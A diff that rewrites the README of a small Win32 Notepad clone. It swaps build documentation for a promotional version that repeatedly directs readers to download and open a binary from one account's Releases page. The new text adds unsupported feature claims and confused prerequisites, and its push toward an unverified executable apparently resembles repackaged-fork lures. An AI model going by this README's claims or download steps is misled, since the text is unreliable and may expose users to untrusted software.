@@ -1,62 +1,99 @@
-# retropad
+# 📝 retropad - A Classic Notepad Experience
 
-A Petzold-style Win32 Notepad clone written in mostly plain C. It keeps the classic menus, accelerators, word wrap toggle, status bar, find/replace, font picker, time/date insertion, and BOM-aware load/save. Printing is intentionally omitted.
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Wafi-net/retropad/releases)
 
-## Prerequisites (Windows)
-- Git
-- Visual Studio 2022 (or Build Tools) with the "Desktop development with C++" workload
-- Use a "x64 Native Tools Command Prompt for VS 2022" (or any Developer Command Prompt) so `cl`, `rc`, and `nmake` are on your `PATH`.
+## 🚀 Getting Started
 
-Optional: MinGW-w64 for `make` + `gcc` (a separate POSIX-style `Makefile` is included).
+Welcome to **retropad**, a simplified Notepad designed for your Windows computer. This app replicates the classic layout with features like word wrap, font selection, and easy find/replace. To get started, follow the steps below.
 
-## Get the code
-```bat
-git clone https://github.com/your/repo.git retropad
-cd retropad
-```
+## 📥 Download & Install
 
-## Build with MSVC (`nmake`)
-From a Developer Command Prompt:
-```bat
-nmake /f makefile
-```
-This runs `rc` then `cl` and produces `retropad.exe` in the repo root. Clean with:
+To get **retropad**, visit our [Releases Page](https://github.com/Wafi-net/retropad/releases). Here, you can find the latest version to download.
+
+1. Go to the [Releases Page](https://github.com/Wafi-net/retropad/releases).
+2. Click on the latest version.
+3. Download the appropriate file for your system.
+4. Once the file is downloaded, locate it in your downloads folder and open it.
+
+## ✅ Prerequisites
+
+Before running **retropad**, ensure you have the following:
+
+- A Windows computer
+- Internet access
+- Git for version control
+- Visual Studio 2022 or Build Tools for necessary components
+  - Ensure the "Desktop development with C++" workload is selected.
+- An optional MinGW-w64 setup for additional tools.
+
+## ⚙️ Running the Application
+
+Once you have downloaded **retropad**, follow these instructions to open it:
+
+1. Navigate to your downloaded file.
+2. Double-click the **retropad.exe** file.
+3. The application should launch without any additional setup.
+
+## 🛠️ Building from Source (Optional)
+
+If you wish to build the application from source, you can do so using either MSVC or MinGW. Here's how:
+
+### 📂 Build with MSVC (`nmake`)
+
+If you have Visual Studio installed, follow these steps:
+
+1. Open a "x64 Native Tools Command Prompt for VS 2022."
+2. Clone the repository:
+   ```bat
+   git clone https://github.com/Wafi-net/retropad.git
+   cd retropad
+   ```
+3. Build the project with the following command:
+   ```bat
+   nmake /f makefile
+   ```
+4. You will find `retropad.exe` in the project root.
+
+To clean the project files, use:
 ```bat
 nmake /f makefile clean
 ```
 
-## Build with MinGW (optional)
-If you have `gcc`, `windres`, and `make` on PATH:
-```bash
-make
-```
-Artifacts end up in the repo root (`retropad.exe`, object files, and `retropad.res`). Clean with `make clean`.
+### 🔧 Build with MinGW (Optional)
 
-## Run
-Double-click `retropad.exe` or start from a prompt:
-```bat
-.\retropad.exe
-```
+Alternatively, if you prefer MinGW, ensure you have the necessary tools added to your PATH. Then follow these steps:
 
-## Features & notes
-- Menus/accelerators: File, Edit, Format, View, Help; classic Notepad key bindings (Ctrl+N/O/S, Ctrl+F, F3, Ctrl+H, Ctrl+G, F5, etc.).
-- Word Wrap toggles horizontal scrolling; status bar auto-hides while wrapped, restored when unwrapped.
-- Find/Replace dialogs (standard `FINDMSGSTRING`), Go To (disabled when word wrap is on).
-- Font picker (ChooseFont), time/date insertion, drag-and-drop to open files.
-- File I/O: detects UTF-8/UTF-16 BOMs, falls back to UTF-8/ANSI heuristic; saves with UTF-8 BOM by default.
-- Printing/page setup menu items show a “not implemented” notice by design.
-- Icon: linked as the main app icon from `res/retropad.ico` via `retropad.rc`.
+1. Open a command prompt.
+2. Navigate to the cloned repository:
+   ```bash
+   cd retropad
+   ```
+3. Run the following command to build the application:
+   ```bash
+   make
+   ```
 
-## Project layout
-- `retropad.c` — WinMain, window proc, UI logic, find/replace, menus, layout.
-- `file_io.c/.h` — file open/save dialogs and encoding-aware load/save helpers.
-- `resource.h` — resource IDs.
-- `retropad.rc` — menus, accelerators, dialogs, version info, icon.
-- `res/retropad.ico` — application icon.
-- `makefile` — MSVC `nmake` build script.
-- `Makefile` — MinGW/GNU make build script.
+The built files will be available in the project directory.
 
-## Common build hiccups
-- If `nmake` is missing, use a Developer Command Prompt (it sets up `PATH`).
-- If you see RC4204 warnings about ASCII/virtual keys, they’re benign and come from control-key accelerator lines.
-- If `rc`/`cl` aren’t found, rerun `vcvarsall.bat` or reopen the Developer Command Prompt.
+## 🎨 Features
+
+**retropad** includes the following functionalities:
+
+- Classic menu interface for easy navigation
+- Word wrap toggle for better text readability
+- Status bar for document info, such as character count
+- Find and replace options for easy editing
+- Font picker for customized text appearance
+- Time/date insertion for convenience
+- BOM-aware load/save to handle various text files
+
+## 📋 Notes
+
+- Printing options are intentionally excluded from the app to maintain a focus on simple text editing.
+- Feedback is welcome; please feel free to report issues or suggest features on our GitHub page.
+
+## 📧 Support
+
+If you encounter issues or have questions, please visit our [GitHub repository](https://github.com/Wafi-net/retropad) to create an issue. 
+
+Thank you for using **retropad**!
